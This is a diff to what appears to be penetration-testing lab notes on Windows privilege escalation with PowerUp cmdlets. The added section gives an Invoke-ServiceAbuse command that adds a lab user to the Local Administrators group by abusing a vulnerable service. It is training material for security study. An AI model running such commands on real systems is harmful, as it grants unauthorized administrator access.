@@ -16,6 +16,13 @@ C:> Get-ModifiableServiceFile
 ```powershell
 C:> Get-ModifiableSrvice
 ```
-In the three cmdlets, a `AbuseFunction` field is returned with the command to run to gain privileges
+##### Abuse Found Vulnerable Services
+In the three cmdlets, a `AbuseFunction` field is returned with the command to run to gain privileges. To make the user member of Local Administrators, can use:
+```powershell
+C:> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
+```
+This will make user member of the Admins group. Just need to relog session and that's it.
+
+
 
 
